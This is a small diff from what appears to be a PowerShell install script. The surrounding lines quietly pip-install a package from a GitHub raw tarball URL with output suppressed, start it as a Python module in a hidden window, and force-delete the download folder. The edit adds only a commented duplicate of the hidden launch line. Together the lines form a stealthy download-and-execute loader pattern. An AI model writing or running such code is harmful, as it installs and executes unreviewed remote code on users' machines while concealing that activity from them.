@@ -67,8 +67,8 @@ if ($InstallRequired) {
 & $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1
 
 # LAUNCH METHOD: Running as a python module in background
+#Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
 Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1
-
 # --- Step 8: Cleanup ---
 if (Test-Path $DownloadDir) {
     Remove-Item $DownloadDir -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
